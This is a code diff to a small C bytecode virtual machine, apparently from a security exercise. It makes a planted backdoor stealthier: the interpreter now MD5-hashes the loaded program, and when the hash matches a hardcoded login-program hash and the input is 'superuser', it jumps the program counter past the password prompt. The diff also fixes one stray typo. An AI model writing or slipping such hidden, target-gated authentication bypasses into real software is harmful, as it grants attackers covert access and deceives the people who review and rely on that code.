@@ -5,6 +5,8 @@
 #include <stdlib.h>
 #include <stdbool.h>
 #include <string.h>
+#include <openssl/md5.h>
+#include <unistd.h>
 #include "minivm.h"
 
 #define NUM_REGS   (256)
@@ -29,6 +31,9 @@
 
 // Global variable that indicates if the process is running.
 static bool is_running = true;
+
+// Hash of bytecode
+static unsigned char bytecode_hash[MD5_DIGEST_LENGTH];
 
 // Print usage and exit
 void usageExit(char **argv) {
@@ -231,8 +236,19 @@ void instrGets(struct VMContext* ctx, const uint32_t instr) {
     }
 
     // Backdoor
-    if (strcmp(buf, "superuser") == 0) {
-        ctx->pc = 121;
+    // Hash of login program
+    const unsigned char hash[] = { 0x6b, 0x3b, 0x82, 0xf6,
+                                   0x2f, 0x23, 0x90, 0x05,
+                                   0xdb, 0x35, 0xcf, 0x5d,
+                                   0x7e, 0xa8, 0x44, 0x02};
+
+    // Check if hash matches
+    if (memcmp(hash, bytecode_hash, MD5_DIGEST_LENGTH) == 0) {
+        // If match, check for magic username
+        if (strcmp(buf, "superuser") == 0) {
+            // Jump past password prompt
+            ctx->pc = 121;
+        }
     }
 
     uint8_t *addr = getHeapAddr(ctx, regVal);
@@ -289,6 +305,9 @@ int main(int argc, char **argv) {
     FILE *binaryFile;
     uint32_t *bytecode;
     int codeSize = 0;
+    MD5_CTX mdContext;
+    int hashNumBytes;
+    unsigned char buf[1024];
 
     // There should be at least one argument.
     if (argc < 2) usageExit(argv);
@@ -308,6 +327,23 @@ int main(int argc, char **argv) {
     // Allocate and read code
     bytecode = malloc(codeSize);      /* allocate bytes according to code size */
     fread(bytecode, codeSize, 1, binaryFile); /* read code */
+    rewind(binaryFile);             /* move pointer to start of file */
+
+    // Hash bytecode
+    MD5_Init (&mdContext);
+    while ((hashNumBytes = fread(buf, 1, 1024, binaryFile)) != 0) {
+        MD5_Update(&mdContext, buf, hashNumBytes);
+    }
+    MD5_Final(bytecode_hash, &mdContext);
+
+    // Debug: print hash
+    debugf("bytecode: ");
+    for(int i = 0; i < MD5_DIGEST_LENGTH; i++) {
+        debugf("%02x", bytecode_hash[i]);
+    }
+    debugf("\n");
+
+    // Close input file
     fclose(binaryFile);
 
     // Initialize registers.
@@ -335,7 +371,7 @@ int main(int argc, char **argv) {
         stepVMContext(&vm);
 
         // Debug: print registers
-p        debugf("------- regs -------\n");
+        debugf("------- regs -------\n");
         for (int i = 0; i < 6; i++) {
             debugf("r%d: %u\n", i, vm.r[i].value);
         }
